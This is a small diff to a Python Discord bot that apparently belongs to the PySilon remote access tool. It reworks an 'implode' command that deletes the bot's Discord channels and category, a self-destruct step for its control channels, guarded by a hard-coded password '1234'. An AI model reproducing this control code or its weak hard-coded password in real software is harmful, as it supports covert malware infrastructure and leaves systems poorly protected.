@@ -87,15 +87,20 @@ async def get_active_clients(ctx):
 
 @client.command(name="implode")
 async def delete_category(ctx,  argument=None, password=None):
-    if argument == "full" and password == "1234":
-        for channel in category.channels:
-            await channel.delete()
-        await category.delete()
-        # implosion code
-    elif argument == "normal" and password == "1234":
-        await ctx.send('`Normal implosion`')
-        # implosion code
-    else:
+    if argument == "full":
+        if password == "1234":
+            for channel in category.channels:
+                await channel.delete()
+            await category.delete()
+            # implosion code
+        else: await ctx.send("```Invalid password! Cannot implode.```")
+        
+    elif argument == "normal":
+        if password == "1234":
+            await ctx.send('`Normal implosion`')
+            # implosion code
+        else: await ctx.send("```Invalid password! Cannot implode.```")
+    else: 
         await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")
 
 # [pysilon] commands
